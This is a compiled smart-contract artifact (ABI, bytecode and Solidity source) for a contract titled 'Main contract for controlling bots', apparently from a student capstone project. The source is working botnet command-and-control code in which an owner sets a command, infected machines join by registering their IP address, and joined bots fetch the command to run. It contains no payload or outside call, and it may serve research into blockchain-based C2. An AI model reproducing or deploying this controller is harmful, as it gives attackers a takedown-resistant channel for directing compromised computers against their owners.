{
  "contractName": "Controller",
  "abi": [
    {
      "constant": true,
      "inputs": [
        {
          "name": "",
          "type": "address"
        }
      ],
      "name": "bots",
      "outputs": [
        {
          "name": "last_checkin",
          "type": "uint256"
        },
        {
          "name": "ip_address",
          "type": "string"
        },
        {
          "name": "initialized",
          "type": "bool"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function",
      "signature": "0xbfd79284"
    },
    {
      "inputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "constructor",
      "signature": "constructor"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "new_command",
          "type": "string"
        }
      ],
      "name": "set_command",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function",
      "signature": "0x174ea651"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "get_command",
      "outputs": [
        {
          "name": "",
          "type": "string"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function",
      "signature": "0xce7ac4a1"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "ip",
          "type": "string"
        }
      ],
      "name": "join",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function",
      "signature": "0x6a786b07"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "is_joined",
      "outputs": [
        {
          "name": "",
          "type": "bool"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function",
      "signature": "0x6f42df06"
    },
    {
      "constant": false,
      "inputs": [],
      "name": "fund",
      "outputs": [],
      "payable": true,
      "stateMutability": "payable",
      "type": "function",
      "signature": "0xb60d4288"
    }
  ],
  "bytecode": "0x608060405234801561001057600080fd5b50336000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550610922806100606000396000f3fe608060405260043610610078576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff168063174ea6511461007d5780636a786b07146101455780636f42df061461020d578063b60d42881461023c578063bfd7928414610246578063ce7ac4a114610322575b600080fd5b34801561008957600080fd5b50610143600480360360208110156100a057600080fd5b81019080803590602001906401000000008111156100bd57600080fd5b8201836020820111156100cf57600080fd5b803590602001918460018302840111640100000000831117156100f157600080fd5b91908080601f016020809104026020016040519081016040528093929190818152602001838380828437600081840152601f19601f8201169050808301925050505050505091929192905050506103b2565b005b34801561015157600080fd5b5061020b6004803603602081101561016857600080fd5b810190808035906020019064010000000081111561018557600080fd5b82018360208201111561019757600080fd5b803590602001918460018302840111640100000000831117156101b957600080fd5b91908080601f016020809104026020016040519081016040528093929190818152602001838380828437600081840152601f19601f820116905080830192505050505050509192919290505050610490565b005b34801561021957600080fd5b506102226105c3565b604051808215151515815260200191505060405180910390f35b61024461061a565b005b34801561025257600080fd5b506102956004803603602081101561026957600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff16906020019092919050505061061c565b604051808481526020018060200183151515158152602001828103825284818151815260200191508051906020019080838360005b838110156102e55780820151818401526020810190506102ca565b50505050905090810190601f1680156103125780820380516001836020036101000a031916815260200191505b5094505050505060405180910390f35b34801561032e57600080fd5b506103376106eb565b6040518080602001828103825283818151815260200191508051906020019080838360005b8381101561037757808201518184015260208101905061035c565b50505050905090810190601f1680156103a45780820380516001836020036101000a031916815260200191505b509250505060405180910390f35b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff16141515610476576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040180806020018281038252600d8152602001807f4d757374206265206f776e65720000000000000000000000000000000000000081525060200191505060405180910390fd5b806001908051906020019061048c929190610851565b5050565b6000600260003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002090508060020160009054906101000a900460ff16151515610580576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260298152602001807f5468697320616464726573732068617320616c7265616479206265656e20696e81526020017f697469616c697a6564000000000000000000000000000000000000000000000081525060400191505060405180910390fd5b81816001019080519060200190610598929190610851565b5042816000018190555060018160020160006101000a81548160ff0219169083151502179055505050565b6000600260003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060020160009054906101000a900460ff16905090565b565b6002602052806000526040600020600091509050806000015490806001018054600181600116156101000203166002900480601f0160208091040260200160405190810160405280929190818152602001828054600181600116156101000203166002900480156106ce5780601f106106a3576101008083540402835291602001916106ce565b820191906000526020600020905b8154815290600101906020018083116106b157829003601f168201915b5050505050908060020160009054906101000a900460ff16905083565b6060600260003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060020160009054906101000a900460ff1615156107b1576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260178152602001807f4d7573742062652070617274206f66206e6574776f726b00000000000000000081525060200191505060405180910390fd5b60018054600181600116156101000203166002900480601f0160208091040260200160405190810160405280929190818152602001828054600181600116156101000203166002900480156108475780601f1061081c57610100808354040283529160200191610847565b820191906000526020600020905b81548152906001019060200180831161082a57829003601f168201915b5050505050905090565b828054600181600116156101000203166002900490600052602060002090601f016020900481019282601f1061089257805160ff19168380011785556108c0565b828001600101855582156108c0579182015b828111156108bf5782518255916020019190600101906108a4565b5b5090506108cd91906108d1565b5090565b6108f391905b808211156108ef5760008160009055506001016108d7565b5090565b9056fea165627a7a72305820b8b4edd8bc57e8b0fdbef96aec63b435968edfdec5ad5d541df929e35d47f7610029",
  "source": "pragma solidity >=0.4.0 <0.6.0;\n\n/// @title Main contract for controlling bots\n/// @author Doshmajhan\ncontract Controller {\n    address owner;\n    string command;\n    \n    struct Bot {\n        uint last_checkin; // last time the bot reported back\n        string ip_address;     // IP the bot is reporting back from\n        bool initialized;    // if this bot has initialized yet\n    }\n\n    mapping(address => Bot) public bots;\n\n    constructor() public {\n        owner = msg.sender;\n    }\n\n    /// @notice Sets the command for the bots to pull down\n    function set_command(string memory new_command) public {\n        require(msg.sender == owner, \"Must be owner\");\n        command = new_command;\n    }\n\n    /// @notice Gets the current command stored for the bots to run\n    /// @return The current stored command\n    function get_command() public view returns (string memory) {\n        require(bots[msg.sender].initialized, \"Must be part of network\");\n        return command;\n    }\n\n    /// @notice Joins a bot to our network with the given ip address and eth address\n    ///     each bot is unique to its eth address it was intialized from\n    /// @param ip The ip address of the computer the bot is running on\n    /// @return True if the join was successful\n    function join(string memory ip) public {\n        Bot storage bot = bots[msg.sender];\n        require(!bot.initialized, \"This address has already been initialized\");\n        bot.ip_address = ip;\n        bot.last_checkin = now;\n        bot.initialized = true;\n    }\n\n    /// @notice Checks if the sender address is joined as a bot\n    /// @return True if join, false if not\n    function is_joined() public view returns (bool) {\n        return bots[msg.sender].initialized;\n    }\n\n    function fund() public payable { }\n}",
  "sourcePath": "/home/doshmajhan/Capstone/legion/contracts/Controller.sol",
  "compiler": {
    "name": "solc",
    "version": "0.5.0+commit.1d4f565a.Emscripten.clang"
  },
  "schemaVersion": "3.0.1",
  "updatedAt": "2019-02-04T01:34:42.542Z",
  "devdoc": {
    "author": "Doshmajhan",
    "methods": {
      "get_command()": {
        "return": "The current stored command"
      },
      "is_joined()": {
        "return": "True if join, false if not"
      },
      "join(string)": {
        "params": {
          "ip": "The ip address of the computer the bot is running on"
        },
        "return": "True if the join was successful"
      }
    },
    "title": "Main contract for controlling bots"
  },
  "userdoc": {
    "methods": {
      "get_command()": {
        "notice": "Gets the current command stored for the bots to run"
      },
      "is_joined()": {
        "notice": "Checks if the sender address is joined as a bot"
      },
      "join(string)": {
        "notice": "Joins a bot to our network with the given ip address and eth address     each bot is unique to its eth address it was intialized from"
      },
      "set_command(string)": {
        "notice": "Sets the command for the bots to pull down"
      }
    }
  }
}